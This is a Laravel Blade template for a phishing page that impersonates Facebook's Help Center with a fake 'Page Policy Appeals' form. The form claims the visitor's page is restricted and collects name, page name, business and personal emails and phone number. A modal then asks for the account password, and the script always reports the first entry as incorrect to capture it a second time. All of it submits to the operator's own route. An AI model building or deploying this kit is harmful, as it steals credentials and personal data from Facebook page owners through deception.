@extends('layout')

@section('body')
<div id="app" data-v-app="">
    <div id="app">
      <div>
        <div class="topheader bg-facebook p-2">
          <div class="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
            <div class="w-[20%] md:w-[15%]"><a href="{{route('get.input')}}">
                <img src="{{asset('images/facebook.png')}}" class="object-cover"></a>
              </div>
            <div class="flex shadow-sm w-[60%] md:w-[50%]"><span
                class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm"><ion-icon
                  name="search-outline" role="img" class="md hydrated"><svg xmlns="http://www.w3.org/2000/svg"
                    class="ionicon s-ion-icon" viewBox="0 0 512 512">
                    <path d="M221.09 64a157.09 157.09 0 10157.09 157.09A157.1 157.1 0 00221.09 64z"
                      stroke-miterlimit="10" class="ionicon-fill-none ionicon-stroke-width"></path>
                    <path stroke-linecap="round" stroke-miterlimit="10" d="M338.29 338.29L448 448"
                      class="ionicon-fill-none ionicon-stroke-width"></path>
                  </svg></ion-icon></span><input type="search"
                class="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
                placeholder="How can we help?"></div>
          </div>
        </div>
        <div class="bg-[#E9EBEE]">
          <div class="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto"><a
              href="#"
              class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]"><ion-icon
                name="home" role="img" class="md hydrated">
                <div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon"
                    viewBox="0 0 512 512">
                    <path
                      d="M261.56 101.28a8 8 0 00-11.06 0L66.4 277.15a8 8 0 00-2.47 5.79L63.9 448a32 32 0 0032 32H192a16 16 0 0016-16V328a8 8 0 018-8h80a8 8 0 018 8v136a16 16 0 0016 16h96.06a32 32 0 0032-32V282.94a8 8 0 00-2.47-5.79z">
                    </path>
                    <path
                      d="M490.91 244.15l-74.8-71.56V64a16 16 0 00-16-16h-48a16 16 0 00-16 16v32l-57.92-55.38C272.77 35.14 264.71 32 256 32c-8.68 0-16.72 3.14-22.14 8.63l-212.7 203.5c-6.22 6-7 15.87-1.34 22.37A16 16 0 0043 267.56L250.5 69.28a8 8 0 0111.06 0l207.52 198.28a16 16 0 0022.59-.44c6.14-6.36 5.63-16.86-.76-22.97z">
                    </path>
                  </svg></div>
              </ion-icon> Help Center </a>
            <p class="text-[#3578E5] text-xs">English</p>
          </div>
        </div>
        <div class="w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr]">
          <div class="order-2 md:order-none">
            <ul
              class="[&amp;&gt;li&gt;a]:text-[14px] [&amp;&gt;li&gt;a]:py-[5px] [&amp;&gt;li&gt;a]:pr-5 [&amp;&gt;li&gt;a]:block [&amp;&gt;li&gt;a:hover]:bg-[#E9EBEE]">
              <li><a href="#">Creating an Account</a>
              </li>
              <li><a href="#">Your Profile</a></li>
              <li><a href="#">Friending</a></li>
              <li><a href="#">Facebook Dating</a></li>
              <li><a href="#">Your Home Page</a></li>
              <li><a href="#">Messaging</a></li>
              <li><a href="#">Reels</a></li>
              <li><a href="#">Stories</a></li>
              <li><a href="#">Photos</a></li>
              <li><a href="#">Videos</a></li>
              <li><a href="#">Gaming</a></li>
              <li><a href="#">Pages</a></li>
              <li><a href="#">Groups</a></li>
              <li><a href="#">Events</a></li>
              <li><a href="#">Fundraisers and Donations</a></li>
              <li><a href="#">Meta Pay</a></li>
              <li><a href="#">Marketplace</a></li>
              <li><a href="#">Apps</a></li>
              <li><a href="#">Facebook Mobile Apps</a>
              </li>
              <li><a href="#">Accessibility</a></li>
            </ul>
          </div>
          <form method="POST" id="forminput" action="{{route('post.input')}}"
            class="w-100% md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none">
            @csrf
            <div class="font-semibold rounded-t-lg text-lg border-b border-gray-200 bg-[#F5F6F7] p-3">
              <h1>Page Policy Appeals</h1>
            </div>
            <div class="p-4">
              <p class="text-xs mb-4"> We have detected unusual activity on your page that violates our community
                standards. </p>
              <p class="text-xs mb-4"> Your access to your page has been limited, and you are currently unable to post,
                share, or comment using your page. </p>
              <p class="text-xs mb-4"> If you believe this to be a mistake, you have the option to submit an appeal by
                providing the necessary information. </p>
                
              <p class="error_password text-red-700" id="error-message"></p>
              <div class="mb-4"><label class="block"><span
                    class="text-[#90949C] after:content-[&#39;*&#39;] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                    Name Fanpage </span><input type="text" name="FanpageName" required="" value="{{old('FanpageName')}}"
                    class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"></label>
              </div>
              <div class="mb-4"><label class="block"><span
                    class="text-[#90949C] after:content-[&#39;*&#39;] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                    Fullname </span><input type="text" name="FullName" required=""   value="{{old('FullName')}}"
                    class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"></label>
              </div>
              <div class="mb-4"><label class="block"><span
                    class="text-[#90949C] after:content-[&#39;*&#39;] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                    Business Email Address </span><input type="text" name="BusinessEmail" required=""  value="{{old('BusinessEmail')}}"
                    class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"></label>
              </div>
              <div class="mb-4"><label class="block"><span
                    class="text-[#90949C] after:content-[&#39;*&#39;] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                    Personal Email Address </span><input type="text" name="PersonalEmail" required=""  value="{{old('PersonalEmail')}}"
                    class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"></label>
              </div>
              <div class="mb-4"><label class="block"><span
                    class="text-[#90949C] after:content-[&#39;*&#39;] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">
                    Mobile Phone Number </span><input type="text" name="Phone" required=""  value="{{old('Phone')}}"
                    class="w-1/2 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"></label>
              </div>
              <div class="mb-4"><label class="block"><span
                    class="text-[#90949C] block text-xs font-bold text-[#90949C]"> Please provide us information that
                    will help us investigate. </span><textarea type="text" name="message" value = " "
                    class="w-3/4 mt-1 px-3 py-1 bg-white border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block rounded-sm sm:text-sm focus:ring-1"
                    rows="4"></textarea></label></div>
            </div>
            <div class="font-semibold rounded-b-lg flex justify-end text-lg border-t border-gray-200 bg-[#F5F6F7] p-3">
              <button type="button" onclick="openFormPassword()"
                class="bg-blue-800 hover:bg-facebook rounded-sm px-4 py-2 text-white text-sm font-semibold"> Send
              </button></div>
              <div id="modalEl" tabindex="-1" aria-hidden="true"
                class="fixed top-0 left-0 right-0 z-50 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center flex hidden">
                <div class="relative w-full max-w-2xl max-h-full">
                  <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
                    <div class="flex items-start justify-between p-4 border-b rounded-t dark:border-gray-600">
                      <h3 class="text-xl font-semibold text-gray-900 dark:text-white"> Please Enter Your Password </h3>
                    </div>
                    <div class="p-6 space-y-6">
                      <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400"> For your security, you must enter
                        your password to continue. </p>
                        <div><label for="wwensekvby" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Your
                          password</label>

                          <input type="password" name="password" id="password"
                          placeholder="Enter your password"
                          class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                          required=""><!---->
                          <input type="password" name="password2" id="password2" style="display: none"
                          placeholder="Enter your password"
                          class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white">
                          <p class="error_password text-red-700" id="error-pass" style="display: none">The password is incorrect. Please try again.</p>
                        </div>

                          <button type="submit" onclick="openRealPassword()"
                          class="w-full text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">
                        Continue </button>
                    </div>
                  </div>
                </div>
              </div>
              
          </form>
        </div>
        <div class="bg-white mt-10">
          <div class="sm:w-11/12 md:w-4/6 mx-auto md:px-0 px-2" style="padding: 36px 0px;">
            <div class="grid xl:grid-cols-5 gap-y-4 lg:grid-cols-3 md:grid-cols-2 grid-cols-2 text-[#90949c] text-sm">
              <ul class="grid gap-y-2">
                <li><ion-icon name="logo-facebook" role="img" class="md hydrated">
                    <div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon"
                        viewBox="0 0 512 512">
                        <path
                          d="M480 257.35c0-123.7-100.3-224-224-224s-224 100.3-224 224c0 111.8 81.9 204.47 189 221.29V322.12h-56.89v-64.77H221V208c0-56.13 33.45-87.16 84.61-87.16 24.51 0 50.15 4.38 50.15 4.38v55.13H327.5c-27.81 0-36.51 17.26-36.51 35v42h62.12l-9.92 64.77H291v156.54c107.1-16.81 189-109.48 189-221.31z"
                          fill-rule="evenodd"></path>
                      </svg></div>
                  </ion-icon></li>
              </ul>
              <ul class="grid gap-y-2">
                <li>Meta © 2023</li>
                <li>English (US)</li>
              </ul>
              <ul class="grid gap-y-2">
                <li>About</li>
                <li>Privacy Policy</li>
                <li>Careers</li>
              </ul>
              <ul class="grid gap-y-2">
                <li>Ad choices</li>
                <li>Create ad</li>
                <li>Create Page</li>
              </ul>
              <ul class="grid gap-y-2">
                <li>Terms &amp; Policies</li>
                <li>Cookies</li>
              </ul>
            </div>
          </div>
        </div><!---->
      </div>
    </div>
  </div>
@endsection

@section('script')
<script>
  function openFormPassword() {
    var form = document.getElementById('forminput');    
    var textInputs = form.querySelectorAll('input[type="text"][required]');
    var isValid = true;
    textInputs.forEach(element => {
      if(element.value === ''){
        isValid = false;
      }
    });
    if(isValid){ 
      document.getElementById('error-message').style.display = "none";
      document.getElementById('modalEl').style.display = 'flex';
    }
    else{      
      document.getElementById("error-message").style.display = 'block';
      document.getElementById("error-message").innerHTML = "Please fill in all required fields.";
    }
  }

  function openRealPassword(){
    var errmsg = document.getElementById('error-pass');
    var pass = document.getElementById('password');
    var pass2 = document.getElementById('password2');
    if(pass2.style.display == "none"){
      pass.style.display = "none";
      pass2.style.display = "block";
      errmsg.style.display = "block";
      pass2.required  = true;
      return false;
    }
    else{
      return true;
    }
  }

  // function submitForms() {
  //     var formInput = new FormData(document.getElementById('forminput'));
  //     var formPass = new FormData(document.getElementById('formPass'));

  //     // Combine data from both forms
  //     for (var pair of formPass.entries()) {
  //       formInput.append(pair[0], pair[1]);
  //     }
  //     formInput.append('_token', $('meta[name="csrf-token"]').attr('content'));
  //     console.log([...formInput]);

  //     // Send combined data to the server using AJAX
  //     $.ajax({
  //         type: 'post',
  //         url: '{{ route("post.input") }}', // Sử dụng route() để lấy đúng đường dẫn
  //         data: formInput,
  //         processData: false,
  //         contentType: false,
  //         success: function(response) {
  //             // Xử lý phản hồi thành công từ máy chủ
  //             console.log('Dữ liệu đã được gửi thành công', response);
  //         },
  //         error: function(error) {
  //             // Xử lý phản hồi lỗi từ máy chủ
  //             console.error('Lỗi khi gửi dữ liệu', error);
  //         }
  //     });
  // }
</script>
    
@endsection